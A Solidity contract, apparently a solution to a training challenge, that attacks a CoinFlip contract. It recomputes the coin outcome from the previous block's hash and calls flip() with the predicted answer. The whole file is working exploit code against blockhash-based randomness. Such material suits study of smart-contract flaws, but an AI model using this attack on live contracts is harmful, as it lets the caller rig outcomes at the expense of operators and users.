// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {CoinFlip} from "./CoinFlip.sol";

contract CoinFlipAttack {
    CoinFlip coinFlip;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address private owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the contract owner can call this function");
        _;
    }

    constructor(address _coinFlipAddress) {
        coinFlip = CoinFlip(_coinFlipAddress);
        owner = msg.sender; // Set the contract deployer as the initial owner
    }

    function predict() public view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlipLocal = blockValue / FACTOR;
        bool side = coinFlipLocal == 1 ? true : false;

        return side;
    }

    function attack() public {
        bool prediction = predict();
        coinFlip.flip(prediction);
    }

    function setCoinFlipAddress(address _coinFlipAddress) public onlyOwner {
        coinFlip = CoinFlip(_coinFlipAddress);
    }
}
